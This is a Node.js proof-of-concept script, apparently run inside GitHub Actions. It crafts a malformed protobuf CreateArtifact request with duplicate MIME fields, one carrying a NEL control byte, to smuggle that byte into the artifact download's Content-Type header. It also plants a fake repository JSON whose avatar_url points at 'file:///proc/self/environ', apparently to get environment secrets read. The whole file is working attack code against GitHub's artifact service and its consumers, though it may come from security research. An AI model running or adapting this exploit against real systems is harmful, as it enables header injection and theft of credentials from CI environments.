import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {CreateArtifactResponse} from '../node_modules/@actions/artifact/lib/generated/results/api/v1/artifact.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const weird = 'application/json\u0085';
const safe = 'application/json';
const runId = process.env.GITHUB_RUN_ID;
const repo = process.env.GITHUB_REPOSITORY;

function varint(value) {
  const bytes = [];
  while (value >= 128) {
    bytes.push((value & 127) | 128);
    value = Math.floor(value / 128);
  }
  bytes.push(value);
  return Buffer.from(bytes);
}

function field(number, value) {
  const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
}

function stringValue(value) {
  return field(1, Buffer.from(value));
}

const name = `repo-cassette-${runId}.json`;

console.log('Building protobuf with duplicate mimeType fields...');
console.log(`Name: ${name}`);
console.log(`NEL MIME hex: ${Buffer.from(weird).toString('hex')}`);

const requestBody = Buffer.concat([
  field(1, ids.workflowRunBackendId),
  field(2, ids.workflowJobRunBackendId),
  field(3, name),
  Buffer.from([0x28, 0x07]),
  field(6, stringValue(weird)),
  field(6, stringValue(safe)),
]);

console.log(`Request body hex: ${requestBody.toString('hex')}`);
console.log(`Request body size: ${requestBody.length}`);

const createUrl = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);

console.log('Sending CreateArtifact with duplicate mimeType...');
const createdResponse = await fetch(createUrl, {
  method: 'POST',
  headers: {
    authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
    'content-type': 'application/protobuf',
  },
  body: requestBody,
});
const createdBytes = new Uint8Array(await createdResponse.arrayBuffer());
if (!createdResponse.ok) {
  console.log(`CreateArtifact HTTP ${createdResponse.status}`);
  console.log(`Response: ${Buffer.from(createdBytes).toString('utf8').slice(0, 300)}`);
  throw new Error(`CreateArtifact failed: HTTP ${createdResponse.status}`);
}

const created = CreateArtifactResponse.fromBinary(createdBytes);
if (!created.ok || !created.signedUploadUrl) {
  throw new Error('CreateArtifact returned no upload URL');
}
console.log('CreateArtifact OK! Upload URL obtained.');

const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
const placeholder = Buffer.from('{}');
await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: weird}});
const digest = createHash('sha256').update(placeholder).digest('hex');

console.log('Blob uploaded. Finalizing...');
const finalized = await client.FinalizeArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name,
  size: String(placeholder.length),
  hash: StringValue.create({value: `sha256:${digest}`}),
});
if (!finalized.ok || !finalized.artifactId) {
  throw new Error('FinalizeArtifact failed');
}

const artifactId = String(finalized.artifactId);
console.log(`Artifact finalized: ID ${artifactId}`);

const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
const payload = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Proto duplicate MIME carrier',
  stargazers_count: 0,
}));
console.log('Uploading real payload...');
await blob.uploadData(payload, {blobHTTPHeaders: {blobContentType: weird}});
console.log(`Payload SHA256: ${createHash('sha256').update(payload).digest('hex')}`);

console.log('Verifying artifact download...');
const endpoint = `https://api.github.com/repos/${repository}`;
const first = await fetch(endpoint, {
  redirect: 'manual',
  headers: {
    accept: 'application/vnd.github.v3+json',
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    'user-agent': 'repo-cassette-proto-audit',
  },
});
const location = first.headers.get('location');
if (!location) {
  throw new Error(`REST route HTTP ${first.status}, no redirect`);
}
const target = new URL(location);
const rsct = target.searchParams.get('rsct') || 'absent';
const rsctHex = Buffer.from(rsct, 'utf8').toString('hex');

const downloaded = await fetch(location, {headers: {'user-agent': 'repo-cassette-proto-audit'}});
const body = Buffer.from(await downloaded.arrayBuffer());
const ct = downloaded.headers.get('content-type') || '';
const ctHex = Buffer.from(ct, 'latin1').toString('hex');

const report = {
  artifactId,
  repository,
  name,
  rsct,
  rsctHex,
  contentType: ct,
  contentTypeHex: ctHex,
  hasNEL: rsct.includes('\u0085') || ct.includes('\u0085'),
  bodyMatches: body.equals(payload),
  payloadSha256: createHash('sha256').update(payload).digest('hex'),
  bodySha256: createHash('sha256').update(body).digest('hex'),
};
console.log(`REPORT ${JSON.stringify(report)}`);

if (report.hasNEL) {
  console.log('SUCCESS! NEL byte present in Content-Type!');
} else {
  console.log(`FAIL: rsct=${rsct} ct=${ct}`);
}
